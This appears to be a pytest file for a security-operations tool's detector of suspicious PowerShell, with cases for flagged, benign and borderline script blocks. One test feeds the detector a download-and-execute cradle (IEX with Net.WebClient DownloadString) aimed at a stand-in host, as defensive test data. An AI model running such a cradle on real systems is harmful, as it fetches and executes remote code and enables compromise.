"""
Tests for suspicious PowerShell detection.
"""

from soc_tool.detections.suspicious_powershell import (
    SuspiciousPowerShellDetector,
)
from soc_tool.models.alert import Alert


def create_alert(script_block_text: str) -> Alert:
    return Alert(
        timestamp="2026-07-01T10:00:00.000+0000",
        agent_name="DC01",
        rule_id="91802",
        rule_level=5,
        event_id="4104",
        username=None,
        source_ip=None,
        script_block_text=script_block_text,
        subject_username=None,
        target_domain="SOCLAB",
        member_name=None,
        event_record_id="17147",
        raw_data={},
    )


def test_detect_suspicious_powershell() -> None:
    alert = create_alert(
        "IEX (New-Object Net.WebClient).DownloadString('http://example.test')"
    )

    detector = SuspiciousPowerShellDetector()

    findings = detector.detect([alert])

    assert len(findings) == 1

    finding = findings[0]

    assert finding.title == "Suspicious PowerShell"
    assert finding.severity == "HIGH"
    assert finding.mitre_id == "T1059.001"
    assert "iex" in finding.evidence["matched_patterns"]
    assert "downloadstring" in finding.evidence["matched_patterns"]


def test_ignore_benign_powershell() -> None:
    alert = create_alert("Get-Service")

    detector = SuspiciousPowerShellDetector()

    findings = detector.detect([alert])

    assert findings == []

def test_ignore_single_invoke_expression_pattern() -> None:
    alert = create_alert(
        script_block_text=(
            '$activateScript = "Activate.ps1"; '
            'Invoke-Expression $activateScript'
        )
    )

    detector = SuspiciousPowerShellDetector()

    findings = detector.detect([alert])

    assert findings == []
